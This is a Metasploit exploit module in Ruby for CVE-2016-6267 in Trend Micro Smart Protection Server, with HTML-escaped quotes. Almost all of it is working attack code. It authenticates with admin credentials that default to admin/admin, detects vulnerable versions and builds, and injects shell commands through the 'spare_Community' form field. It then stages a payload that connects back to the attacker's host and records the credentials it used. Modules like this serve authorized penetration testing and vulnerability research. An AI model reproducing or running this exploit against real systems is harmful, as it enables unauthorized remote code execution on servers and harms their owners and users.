# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;openssl&#039;
require &#039;base64&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Trend Micro Smart Protection Server Exec Remote Code Injection",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in TrendMicro Smart Protection Server where untrusted inputs are fed to ServWebExec system command, leading to command injection.
        Please note: authentication is required to exploit this vulnerability.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Quentin Kaiser <kaiserquentin[at]gmail.com>&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE-ID&#039;, &#039;CVE-2016-6267&#039;]
        ],
      &#039;Platform&#039;        => &#039;linux&#039;,
      &#039;Targets&#039;         => [ [ &#039;Linux&#039;, {} ] ],
      &#039;Payload&#039;         => { &#039;BadChars&#039; => "\x00" },
      &#039;CmdStagerFlavor&#039; => [ &#039;bourne&#039; ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultOptions&#039; =>
      {
         &#039;SSL&#039; => true
      },
      &#039;DisclosureDate&#039; => "Aug 8 2016",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptBool.new(&#039;SSL&#039;, [ true, &#039;Use SSL&#039;, true ]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path&#039;, &#039;/&#039;]),
        OptAddress.new("LHOST", [true, "The local host for the exploits and handlers", Rex::Socket.source_address]),
        OptPort.new(&#039;LPORT&#039;, [true, "The port SPS will connect back to ", 4444 ]),
        OptString.new(&#039;ADMINACCOUNT&#039;, [true, &#039;Name of the SPS admin account&#039;, &#039;admin&#039;]),
        OptString.new(&#039;ADMINPASS&#039;, [true, &#039;Password of the SPS admin account&#039;, &#039;admin&#039;]),
      ], self.class)
  end


  def check
    opts = login
    if opts
      uri = target_uri.path
      res = send_request_cgi({
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;uri&#039;      => normalize_uri(uri, "php/about.php?sid=#{opts[&#039;sid&#039;]}"),
        &#039;headers&#039;=>
        {
          &#039;Cookie&#039; => "#{opts["sid"]}=#{opts["sid_value"]}",
          &#039;Referer&#039; => "https://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}/login.php",
          &#039;Origin&#039; =>  "https://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}",
        }
      })
      if res and res.code == 200
        version = res.body.to_s.scan(/MSG_ABOUT_VERSION <\/td>[^<]*<td[^>]*>([^<]*)</).last.first.to_f
        build = res.body.to_s.scan(/MSG_ABOUT_BUILD <\/td>[^<]*<td[^>]*><span[^>]*>([^<]*)</).last.first.to_i(10)
        print_status("TrendMicro Smart Protection Server detected.")
        print_status("Version: #{version}")
        print_status("Build: #{build}")
        if (version == 3.0 and build < 1330) or
          (version == 2.6 and build < 2106) or
          (version == 2.5 and build < 2200)
            return Exploit::CheckCode::Vulnerable
        else
          return Exploit::CheckCode::Safe
        end
      end
    end
    Exploit::CheckCode::Unknown
  end


  def execute_command(cmd, opts = {})
    uri = target_uri.path
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;version&#039; => &#039;1.0&#039;,
      &#039;timeout&#039; => 1,
      &#039;uri&#039; => normalize_uri(uri, &#039;php/admin_notification.php&#039;),
      &#039;ctype&#039; => &#039;application/x-www-form-urlencoded&#039;,
      &#039;headers&#039;=>
      {
        &#039;Cookie&#039; => "#{opts["sid"]}=#{opts["sid_value"]}",
        &#039;Referer&#039; => "https://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}/login.php",
        &#039;Origin&#039; =>  "https://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}",
      },
      &#039;vars_post&#039; => {
        &#039;EnableSNMP&#039; => &#039;on&#039;,
        &#039;Community&#039; => &#039;hello&#039;,
        &#039;submit&#039; => &#039;Save&#039;,
        &#039;pubkey&#039; => &#039;&#039;,
        &#039;spare_EnableSNMP&#039; => 1,
        &#039;spare_Community&#039; => "test;#{cmd}",
        &#039;spare_EnableIPRestriction&#039; => 0,
        &#039;spare_AllowGroupIP&#039; => &#039;&#039;,
        &#039;spare_AllowGroupNetmask&#039; => &#039;&#039;,
        &#039;sid&#039; => opts["sid"]
      }
    })
  end

  def login
    uri = target_uri.path
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
    })
    if res and res.code == 200 and !res.get_cookies.empty?
      sid = res.get_cookies.scan(/([^=]*)=[^;]*;/).last.first.strip
      sid_value = res.get_cookies.scan(/#{sid}=([a-z0-9]+);/).last.first
      n = res.body.to_s.scan(/name="pubkey" value="([^"]*)"/).last.first
      nonce = res.body.to_s.scan(/name="nonce" value="([^"]*)"/).last.first
      asn1_sequence = OpenSSL::ASN1::Sequence.new(
        [
          OpenSSL::ASN1::Integer.new("0x#{n}".to_i(16)),
          OpenSSL::ASN1::Integer.new("0x10001".to_i(16))
        ]
      )
      public_key = OpenSSL::PKey::RSA.new(asn1_sequence)
      creds = "#{datastore[&#039;ADMINACCOUNT&#039;]}\t#{datastore[&#039;ADMINPASS&#039;]}\t#{nonce}"
      data = Base64.encode64(public_key.public_encrypt(creds))
      res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(uri, "auth.php"),
        &#039;ctype&#039; => &#039;application/x-www-form-urlencoded&#039;,
        &#039;headers&#039;=>
        {
          &#039;Cookie&#039; => "#{sid}=#{sid_value}",
          &#039;Referer&#039; => "https://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}/login.php",
          &#039;Origin&#039; =>  "https://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}",
        },
        &#039;vars_post&#039; => {
          &#039;data&#039; => data,
          &#039;sid&#039; => sid
        }
      })
      if res and res.code == 302
        if res.headers.key?(&#039;Set-Cookie&#039;)
          sid = res.get_cookies.scan(/([^=]*)=[^;]*;/).last.first
          sid_value = res.get_cookies.scan(/#{sid}=([^;]*);/).last.first
        end
        report_cred(
            ip: datastore[&#039;RHOST&#039;],
            port: datastore[&#039;RPORT&#039;],
            service_name: (ssl ? "https" : "http"),
            user: datastore[&#039;ADMINACCOUNT&#039;],
            password: datastore[&#039;ADMINPASS&#039;],
            proof: "#{sid}=#{sid_value}"
        )
        return {"sid" => sid, "sid_value" => sid_value}
      end
    end
    nil
  end

  def report_cred(opts)
    service_data = {
        address: opts[:ip],
        port: opts[:port],
        service_name: opts[:service_name],
        protocol: &#039;tcp&#039;,
        workspace_id: myworkspace_id
    }

    credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: opts[:user],
        private_data: opts[:password],
        private_type: :password
    }.merge(service_data)

    login_data = {
        core: create_credential(credential_data),
        status: Metasploit::Model::Login::Status::SUCCESSFUL,
        proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def exploit
    opts = login
    if opts
      print_status("Successfully logged in.")
      print_status("Exploiting...")
      execute_cmdstager(opts=opts)
    else
      print_error("An error occured while loggin in.")
    end
  end
end

